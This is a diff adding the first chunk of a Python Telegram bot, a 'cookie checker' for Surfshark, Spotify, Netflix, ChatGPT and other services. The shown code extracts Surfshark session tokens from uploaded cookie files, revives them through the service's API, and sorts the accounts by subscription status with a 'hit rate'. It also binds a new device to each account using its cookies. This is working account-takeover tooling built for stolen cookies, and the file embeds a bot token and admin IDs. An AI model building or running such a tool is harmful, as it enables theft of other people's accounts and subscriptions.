@@ -1,0 +1,587 @@
+# -*- coding: utf-8 -*-
+"""
+combined_bot.py — Master Cookie Checker Bot
+==============================================
+9 Services:
+  Surfshark · Spotify · JioHotstar · Netflix · HBO Max
+  ChatGPT · Cursor · Instagram · Cookie Scanner
+"""
+
+# ── stdlib ──────────────────────────────────────────────────────────────────
+import os
+import re
+import io
+import json
+import glob
+import time
+import uuid
+import base64
+import asyncio
+import logging
+import tempfile
+import zipfile
+from collections import defaultdict
+from concurrent.futures import ThreadPoolExecutor
+from datetime import datetime
+from typing import Optional, Dict
+
+# ── third-party ─────────────────────────────────────────────────────────────
+import shutil
+import requests
+requests.packages.urllib3.disable_warnings()
+import cloudscraper
+import cv2
+import numpy as np
+try:
+    from pyzbar.pyzbar import decode as pyzbar_decode
+    _PYZBAR_OK = True
+except Exception:
+    _PYZBAR_OK = False
+
+from aiogram import Bot, Dispatcher, types, Router, F
+from aiogram.filters import Command
+from aiogram.client.default import DefaultBotProperties
+from aiogram.enums import ParseMode
+from aiogram.types import (
+    InlineKeyboardMarkup, InlineKeyboardButton,
+    BufferedInputFile, FSInputFile,
+)
+from aiogram.exceptions import TelegramRetryAfter, TelegramBadRequest
+
+
+# ╔══════════════════════════════════════════════════════════════════════════╗
+# ║                         GLOBAL CONFIGURATION                            ║
+# ╚══════════════════════════════════════════════════════════════════════════╝
+
+TOKEN            = "8864192904:AAEFcViE9l5qhj8bDeUjTFe6XWLvttRkyvw"
+OWNER_ID         = 8206978592
+ADMIN_IDS        = [8206978592]
+GC_STORE_CHAT_ID = -1003795346094
+
+MAX_WORKERS     = 20
+REQUEST_TIMEOUT = 20
+MAX_FILE_SIZE   = 50 * 1024 * 1024   # 50 MB
+
+# ── output folders (per service) ─────────────────────────────────────────
+_DIRS = [
+    "ss_premium", "ss_free", "ss_dead",
+    "sp_premium", "sp_free", "sp_dead",
+    "hs_live", "hs_device", "hs_free", "hs_invalid",
+    "nf_premium", "nf_free", "nf_dead", "nf_tokens",
+    "hbo_live", "hbo_dead",
+    "cg_premium", "cg_free", "cg_dead",
+    "cur_pro", "cur_free", "cur_dead",
+    "ig_live", "ig_dead",
+    "scan_live", "scan_dead",
+]
+for _d in _DIRS:
+    os.makedirs(_d, exist_ok=True)
+
+NF_VAULT_DIR = "nf_vault"
+os.makedirs(NF_VAULT_DIR, exist_ok=True)
+
+HS_VAULT_DIR        = "hs_vault"
+HS_VAULT_USAGE_FILE = "hs_vault_usage.json"
+HS_VAULT_STATS_FILE = "hs_vault_stats.json"
+HS_VAULT_MAX_USES   = 3
+os.makedirs(HS_VAULT_DIR, exist_ok=True)
+
+# ── logging ──────────────────────────────────────────────────────────────
+logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)
+logger = logging.getLogger(__name__)
+
+
+# ╔══════════════════════════════════════════════════════════════════════════╗
+# ║                         ANIMATED EMOJI HELPERS                          ║
+# ╚══════════════════════════════════════════════════════════════════════════╝
+
+def _e(eid: str, fb: str) -> str:
+    return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>'
+
+# shared
+E_CHECK   = _e("6100541628496219252", "✅")
+E_FILE    = _e("5888646724003566593", "📄")
+E_COUNT   = _e("5226929552319594190", "🔢")
+E_ZIP     = _e("6089423023318766264", "📦")
+E_STATS   = _e("6093382540784046658", "📊")
+E_TRASH   = _e("5235927882466876283", "🗑")
+E_HELP    = _e("5298955887585538580", "❓")
+E_EMPTY   = _e("5287533898803211359", "📭")
+E_GEAR    = _e("6102850718878665815", "⚙️")
+E_DOWN    = _e("6102486063270333582", "⬇️")
+E_FOLDER  = _e("5298853345241358103", "📂")
+E_CLOCK   = _e("6010111371251815589", "⏳")
+E_PLAN    = _e("6104891515539033627", "🎫")
+E_DATE    = _e("5274055917766202507", "📅")
+E_EMAIL   = _e("6188374109131377154", "📧")
+E_COUNTRY = _e("6071225946965284290", "🌍")
+
+# Surfshark-specific
+SS_PREMIUM = _e("6070856180345868814", "🟢")
+SS_FREE    = _e("5123344136665039833", "⚪")
+SS_DEAD    = _e("6100515480735321747", "❌")
+SS_REVIVED = _e("6102394417258171824", "🔄")
+SS_PRICE   = _e("5310278924616356636", "💰")
+SS_SHIELD  = _e("6086672466132865380", "🛡")
+SS_LOGIN   = _e("6102394417258171824", "🔑")
+
+# Spotify-specific
+SP_PREMIUM = _e("5296372434692234934", "💚")
+SP_FREE    = _e("5341371571556612986", "🩶")
+SP_DEAD    = _e("5343978724079467577", "💀")
+SP_MUSIC   = _e("5278712667337409114", "🎵")
+SP_TV      = _e("5231250323779116601", "📺")
+SP_BOLT    = _e("5303040337059543238", "⚡")
+SP_SPARK   = _e("5343584360182349563", "✨")
+SP_SEARCH  = _e("5318972874726339331", "🔍")
+SP_CODE    = _e("5305757775752620395", "🔐")
+
+# JioHotstar-specific
+HS_LIVE    = _e("6070856180345868814", "🟢")
+HS_DEVICE  = _e("6102394417258171824", "⚠️")
+HS_FREE    = _e("5123344136665039833", "⚪")
+HS_INVALID = _e("6100515480735321747", "❌")
+HS_USER    = _e("4904848288345228262", "👤")
+HS_PHONE   = _e("5800685308450182011", "📱")
+HS_TV      = _e("5231250323779116601", "📺")
+HS_TARGET  = _e("5310278924616356636", "🎯")
+HS_SHIELD  = _e("6086672466132865380", "🛡")
+
+# Action / status emojis (shared)
+E_WRENCH   = _e("4904936030232117798", "🔧")
+E_CAMERA   = _e("5373056919688731596", "📸")
+E_PARTY    = _e("5801170880272797821", "🎉")
+E_ID       = _e("5278510335723066039", "🆔")
+E_UPLOAD   = _e("6071202170026332329", "📤")
+E_NO       = _e("6093778090092139204", "⛔")
+
+# ── Unicode bold text converter ───────────────────────────────────────────────
+_BOLD_MAP: dict = {}
+for _i, _c in enumerate("ABCDEFGHIJKLMNOPQRSTUVWXYZ"):
+    _BOLD_MAP[_c] = chr(0x1D5D4 + _i)
+for _i, _c in enumerate("abcdefghijklmnopqrstuvwxyz"):
+    _BOLD_MAP[_c] = chr(0x1D5EE + _i)
+for _i, _c in enumerate("0123456789"):
+    _BOLD_MAP[_c] = chr(0x1D7EC + _i)
+
+def bold(text: str) -> str:
+    return "".join(_BOLD_MAP.get(c, c) for c in text)
+
+
+# ╔══════════════════════════════════════════════════════════════════════════╗
+# ║                    NEW SERVICE EMOJIS (ChatGPT/Cursor/IG/Scan)          ║
+# ╚══════════════════════════════════════════════════════════════════════════╝
+
+CG_EMOJI   = _e("6134246530380472478", "💬")
+CUR_EMOJI  = _e("6273793612715138423", "⚡")
+IG_EMOJI   = _e("5319160079465857105", "📸")
+SCAN_EMOJI = _e("6012792650615230712", "🌐")
+
+# ChatGPT-specific
+CG_PREMIUM = _e("6070856180345868814", "🟢")
+CG_FREE    = _e("5123344136665039833", "⚪")
+CG_DEAD    = _e("6100515480735321747", "❌")
+
+# Cursor-specific
+CUR_PRO    = _e("6070856180345868814", "🟢")
+CUR_FREE   = _e("5123344136665039833", "⚪")
+CUR_DEAD   = _e("6100515480735321747", "❌")
+
+# Instagram-specific
+IG_LIVE    = _e("6070856180345868814", "🟢")
+IG_DEAD    = _e("6100515480735321747", "❌")
+
+# Scan-specific
+SCAN_LIVE  = _e("6070856180345868814", "🟢")
+SCAN_DEAD  = _e("6100515480735321747", "❌")
+
+
+# ╔══════════════════════════════════════════════════════════════════════════╗
+# ║                         SHARED UTILITIES                                ║
+# ╚══════════════════════════════════════════════════════════════════════════╝
+
+def _pbar(done: int, total: int, width: int = 12) -> str:
+    filled = int(width * done / total) if total else 0
+    return "▓" * filled + "░" * (width - filled)
+
+
+async def safe_edit(msg, text: str, markup=None) -> None:
+    kwargs = {"text": text, "parse_mode": "HTML"}
+    if markup:
+        kwargs["reply_markup"] = markup
+    try:
+        await msg.edit_text(**kwargs)
+    except TelegramRetryAfter as e:
+        await asyncio.sleep(e.retry_after + 1)
+        try:
+            await msg.edit_text(**kwargs)
+        except Exception:
+            pass
+    except TelegramBadRequest as e:
+        if "Message is not modified" not in str(e):
+            logger.warning(f"BadRequest: {e}")
+    except Exception as e:
+        logger.warning(f"safe_edit: {e}")
+
+
+def extract_zip_cookies(zip_path: str, prefix: str = "cookie") -> list:
+    files = []
+    tmp   = tempfile.gettempdir()
+    try:
+        with zipfile.ZipFile(zip_path, "r") as zf:
+            for name in zf.namelist():
+                if name.endswith("/") or name.startswith(("__MACOSX", ".")):
+                    continue
+                if name.lower().endswith((".txt", ".json")):
+                    content  = zf.read(name).decode("utf-8", errors="ignore")
+                    out_path = os.path.join(
+                        tmp,
+                        f"{prefix}_{int(time.time())}_{abs(hash(name))}_{name.replace('/', '_')}",
+                    )
+                    with open(out_path, "w", encoding="utf-8") as f:
+                        f.write(content)
+                    files.append(out_path)
+    except Exception as e:
+        logger.error(f"ZIP extract error: {e}")
+    return files
+
+
+# ╔══════════════════════════════════════════════════════════════════════════╗
+# ║              SURFSHARK CHECKER                                          ║
+# ╚══════════════════════════════════════════════════════════════════════════╝
+
+SS_UA_CHECK = "SurfsharkAndroid/3.27.0 com.surfshark.vpnclient.android/release/playStore/310041035 device/firewall"
+SS_UA_LOGIN = "Surfshark/4.1.2 (com.surfshark.vpnclient.ios; build:4; iOS 26.1.0) Alamofire/5.10.2 device/mobile"
+
+
+def ss_extract_token(content: str, token_name: str) -> Optional[str]:
+    for pattern in [
+        rf'{token_name}[=\s]+([A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)',
+        rf'"{token_name}"\s*:\s*"([^"]+)"',
+        rf'{token_name}\s+([eyJ][A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)',
+    ]:
+        m = re.search(pattern, content)
+        if m and m.group(1).count(".") >= 2:
+            return m.group(1)
+    for line in content.split("\n"):
+        if token_name not in line:
+            continue
+        clean = line[10:] if line.startswith("#HttpOnly_") else line
+        if clean.startswith("#") and not line.startswith("#HttpOnly_"):
+            continue
+        parts = re.split(r"\t+|\s+", clean)
+        for i, part in enumerate(parts):
+            if part == token_name and i + 1 < len(parts):
+                val = parts[i + 1].strip()
+                if val and not val.startswith("#"):
+                    if val.count(".") >= 2:
+                        return val
+                    m = re.search(r"eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+", val)
+                    if m:
+                        return m.group(0)
+    return None
+
+
+def ss_revive_token(ssrtk: str) -> Optional[Dict]:
+    if not ssrtk:
+        return None
+    try:
+        resp = requests.post(
+            "https://api.surfshark.com/v1/auth/renew",
+            json={},
+            headers={
+                "Content-Type":  "application/json;charset=utf-8",
+                "Accept":        "application/json",
+                "User-Agent":    SS_UA_LOGIN,
+                "Authorization": f"Bearer {ssrtk}",
+            },
+            timeout=10,
+        )
+        if resp.status_code == 200:
+            data = resp.json()
+            new_sstk = data.get("token")
+            if new_sstk:
+                return {"sstk": new_sstk, "ssrtk": data.get("renewToken", ssrtk)}
+    except Exception:
+        pass
+    return None
+
+
+def ss_get_account_info(sstk: str) -> Optional[Dict]:
+    headers = {
+        "Accept":          "application/json",
+        "Accept-Encoding": "gzip",
+        "Cache-Control":   "no-cache",
+        "Connection":      "Keep-Alive",
+        "Host":            "api.surfshark.com",
+        "User-Agent":      SS_UA_CHECK,
+        "Authorization":   f"Bearer {sstk}",
+    }
+    results = {}
+    try:
+        r = requests.get(
+            "https://api.surfshark.com/v2/account/users/me",
+            headers=headers, timeout=REQUEST_TIMEOUT, verify=False,
+        )
+        if r.status_code == 200:
+            results["user"] = r.json()
+        elif r.status_code in (401, 403):
+            return None
+    except Exception:
+        pass
+    try:
+        r = requests.get(
+            "https://api.surfshark.com/v1/payment/subscriptions/current",
+            headers=headers, timeout=REQUEST_TIMEOUT, verify=False,
+        )
+        if r.status_code == 200:
+            results["sub"] = r.json()
+        elif r.status_code in (401, 403):
+            return None
+    except Exception:
+        pass
+    return results if results.get("user") else None
+
+
+def ss_parse_sub(sub_data: Dict) -> Dict:
+    if not sub_data:
+        return {"plan": "Unknown", "status": "Unknown", "expires_at": "Unknown",
+                "price": "Unknown", "country": "Unknown", "region": "Unknown"}
+    plan_raw = sub_data.get("name") or sub_data.get("plan", "Unknown")
+    if isinstance(plan_raw, dict):
+        plan_raw = plan_raw.get("name", str(plan_raw))
+    plan = str(plan_raw)
+    for pfx in ["Surfshark - ", "Surfshark-"]:
+        if plan.startswith(pfx):
+            plan = plan[len(pfx):]
+    price = "Unknown"
+    p = sub_data.get("price", {})
+    if isinstance(p, dict) and "amount" in p:
+        amount   = p["amount"] / 100
+        cur      = p.get("currency", {})
+        cur_code = cur.get("code", "USD") if isinstance(cur, dict) else "USD"
+        price    = f"${amount:.2f} {cur_code}"
+    return {
+        "plan":       plan[:50],
+        "status":     sub_data.get("status", "Unknown"),
+        "expires_at": sub_data.get("expiresAt", "Unknown"),
+        "price":      price,
+        "region":     sub_data.get("regionName", "Unknown"),
+        "country":    sub_data.get("taxCountry", "Unknown"),
+    }
+
+
+def ss_calc_days_left(expires_at: str) -> int:
+    try:
+        exp_str = expires_at.split("T")[0]
+        exp_dt  = datetime.strptime(exp_str, "%Y-%m-%d")
+        return max(0, (exp_dt - datetime.now()).days)
+    except Exception:
+        return 0
+
+
+def ss_get_subscription_info(sstk: str):
+    try:
+        resp = requests.get(
+            "https://api.surfshark.com/v1/payment/subscriptions/current",
+            headers={
+                "Accept":        "application/json",
+                "User-Agent":    SS_UA_LOGIN,
+                "Authorization": f"Bearer {sstk}",
+            },
+            timeout=REQUEST_TIMEOUT,
+            verify=False,
+        )
+        if resp.status_code == 200:
+            data = resp.json()
+            if data and "name" in data:
+                plan   = data.get("name", "Unknown")
+                status = data.get("status", "Unknown").lower()
+                is_premium = status in ("active", "active_grace") and "free" not in plan.lower()
+                return is_premium, {
+                    "plan":       plan,
+                    "status":     data.get("status", "Unknown"),
+                    "expires_at": data.get("expiresAt", "Unknown"),
+                }
+            return False, {"error": "No subscription data"}
+        if resp.status_code == 204:
+            return False, {"error": "No active subscription"}
+        return False, {"error": f"HTTP {resp.status_code}"}
+    except Exception as e:
+        return False, {"error": str(e)[:60]}
+
+
+def ss_check_one(content: str, filename: str = "") -> Dict:
+    sstk  = ss_extract_token(content, "_sstk")
+    ssrtk = ss_extract_token(content, "_ssrtk")
+    if not ssrtk:
+        if not sstk:
+            return {"status": "DEAD", "reason": "No _sstk or _ssrtk found", "filename": filename, "content": content}
+        return {"status": "DEAD", "reason": "No _ssrtk found — cannot revive", "filename": filename, "content": content}
+    revived_tokens = ss_revive_token(ssrtk)
+    if not revived_tokens:
+        return {"status": "DEAD", "reason": "Token revive failed", "filename": filename, "content": content}
+    fresh_sstk  = revived_tokens["sstk"]
+    fresh_ssrtk = revived_tokens.get("ssrtk", ssrtk)
+    api_info = ss_get_account_info(fresh_sstk)
+    if not api_info:
+        return {"status": "DEAD", "reason": "Fresh token rejected by API", "filename": filename, "content": content}
+    email    = api_info.get("user", {}).get("email", "Unknown")
+    is_premium, sub_info = ss_get_subscription_info(fresh_sstk)
+    plan       = sub_info.get("plan", "Unknown")
+    status_raw = sub_info.get("status", "Unknown")
+    expires_at = sub_info.get("expires_at", "Unknown")
+    if "T" in expires_at:
+        expires_at = expires_at.split("T")[0]
+    d_left = ss_calc_days_left(expires_at)
+    raw_sub  = api_info.get("sub", {})
+    parsed   = ss_parse_sub(raw_sub) if raw_sub else {}
+    return {
+        "status":     "PREMIUM" if is_premium else "FREE",
+        "email":      email,
+        "plan":       plan,
+        "status_raw": status_raw,
+        "expires_at": expires_at,
+        "days_left":  d_left,
+        "price":      parsed.get("price", "Unknown"),
+        "region":     parsed.get("region", "Unknown"),
+        "country":    parsed.get("country", "Unknown"),
+        "filename":   filename,
+        "content":    content,
+        "sstk":       fresh_sstk,
+        "ssrtk":      fresh_ssrtk,
+        "revived":    True,
+    }
+
+
+def ss_check_file(filepath: str) -> Dict:
+    try:
+        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
+            content = f.read()
+        return ss_check_one(content, os.path.basename(filepath))
+    except Exception as e:
+        return {"status": "DEAD", "reason": f"Read error: {str(e)[:40]}",
+                "filename": os.path.basename(filepath), "content": ""}
+
+
+def ss_authorize_device(cookie_content: str, sstk: str, code: str) -> tuple:
+    cookies = {}
+    for line in cookie_content.split("\n"):
+        line = line.strip()
+        if not line or line.startswith("#"):
+            continue
+        if "\t" in line:
+            parts = line.split("\t")
+            if len(parts) >= 7:
+                cookies[parts[5]] = parts[6]
+        elif "=" in line:
+            k, _, v = line.partition("=")
+            k = k.strip()
+            if k:
+                cookies[k] = v.strip()
+    cookie_string = "; ".join(f"{k}={v}" for k, v in cookies.items())
+    try:
+        resp = requests.post(
+            "https://my.surfshark.com/account/p_api/v1/account/authorization/assign",
+            json={"code": code.upper().strip()},
+            headers={
+                "Content-Type":     "application/json;charset=utf-8",
+                "Accept":           "application/json",
+                "User-Agent":       SS_UA_LOGIN,
+                "Cookie":           cookie_string,
+                "X-Requested-With": "XMLHttpRequest",
+                "Origin":           "https://my.surfshark.com",
+                "Referer":          "https://my.surfshark.com/account/login-code",
+            },
+            timeout=15,
+        )
+        if resp.status_code in (200, 201, 204):
+            return True, ""
+        try:
+            body = resp.json()
+            err  = body.get("message") or body.get("error") or body.get("detail") or str(body)
+        except Exception:
+            err = resp.text[:120] if resp.text else "no body"
+        return False, f"HTTP {resp.status_code} — {err}"
+    except requests.exceptions.Timeout:
+        return False, "Request timed out"
+    except Exception as e:
+        return False, str(e)[:120]
+
+
+def ss_fmt_premium(r: dict) -> str:
+    rev_tag = f"  {SS_REVIVED} <i>Auto-Revived</i>" if r.get("revived") else ""
+    return (
+        f"╔═══════════════════════════╗\n"
+        f"║  {SS_PREMIUM} <b>SS PREMIUM HIT!</b>{rev_tag}\n"
+        f"╚═══════════════════════════╝\n\n"
+        f"{E_EMAIL}  <b>Email   :</b> <code>{r.get('email','Unknown')}</code>\n"
+        f"{E_PLAN}  <b>Plan    :</b> <code>{r.get('plan','Unknown')}</code>\n"
+        f"{E_DATE}  <b>Expiry  :</b> <code>{r.get('expires_at','Unknown')}</code>\n"
+        f"{E_CLOCK}  <b>Days    :</b> <code>{r.get('days_left','?')} days left</code>\n"
+        f"{SS_PRICE}  <b>Price   :</b> <code>{r.get('price','Unknown')}</code>\n"
+        f"{E_COUNTRY}  <b>Country :</b> <code>{r.get('country','Unknown')}</code>\n"
+        f"{E_FILE}  <b>File    :</b> <code>{r.get('filename','?')}</code>"
+    )
+
+
+def ss_fmt_free(r: dict) -> str:
+    return (
+        f"╔═══════════════════════════╗\n"
+        f"║  {SS_FREE} <b>SS FREE / EXPIRED</b>      ║\n"
+        f"╚═══════════════════════════╝\n\n"
+        f"{E_EMAIL}  <b>Email   :</b> <code>{r.get('email','Unknown')}</code>\n"
+        f"{E_PLAN}  <b>Plan    :</b> <code>{r.get('plan','Unknown')}</code>\n"
+        f"{E_DATE}  <b>Expiry  :</b> <code>{r.get('expires_at','Unknown')}</code>\n"
+        f"{E_FILE}  <b>File    :</b> <code>{r.get('filename','?')}</code>\n\n"
+        f"<i>Subscription expired or canceled.</i>"
+    )
+
+
+def ss_fmt_dead(r: dict) -> str:
+    return (
+        f"╔═══════════════════════════╗\n"
+        f"║  {SS_DEAD} <b>SS DEAD COOKIE</b>         ║\n"
+        f"╚═══════════════════════════╝\n\n"
+        f"{E_FILE}  <b>File    :</b> <code>{r.get('filename','?')}</code>\n"
+        f"{SS_DEAD}  <b>Reason  :</b> <code>{r.get('reason','Unknown error')}</code>"
+    )
+
+
+def ss_fmt_single(r: dict) -> str:
+    s = r.get("status")
+    if s == "PREMIUM": return ss_fmt_premium(r)
+    if s == "FREE":    return ss_fmt_free(r)
+    return ss_fmt_dead(r)
+
+
+def ss_fmt_progress(processed, total, premium, free, dead, revived):
+    pct = int(processed / total * 100) if total else 0
+    bar = _pbar(processed, total)
+    return (
+        f"{E_GEAR} <b>Surfshark Checker</b> — Running\n\n"
+        f"<code>[{bar}] {pct}%</code>\n"
+        f"<b>{processed}</b> / <b>{total}</b> checked\n\n"
+        f"{SS_PREMIUM} Premium  : <b>{premium}</b>\n"
+        f"{SS_FREE} Free     : <b>{free}</b>\n"
+        f"{SS_DEAD} Dead     : <b>{dead}</b>\n"
+        f"{SS_REVIVED} Revived  : <b>{revived}</b>"
+    )
+
+
+def ss_fmt_summary(total, premium, free, dead, revived):
+    pct = f"{premium / total * 100:.1f}" if total else "0.0"
+    return (
+        f"{E_CHECK} <b>Surfshark Check Complete!</b>\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"{E_COUNT} Total    : <b>{total}</b>\n"
+        f"{SS_PREMIUM} Premium  : <b>{premium}</b>  (<i>{pct}% hit rate</i>)\n"
+        f"{SS_FREE} Free     : <b>{free}</b>\n"
+        f"{SS_DEAD} Dead     : <b>{dead}</b>\n"
+        f"{SS_REVIVED} Revived  : <b>{revived}</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"{E_ZIP} Click <b>Get Results ZIP</b> to download all cookies."
+    )
+
+
+# ══════════════════════════ END OF CHUNK 1 ══════════════════════════
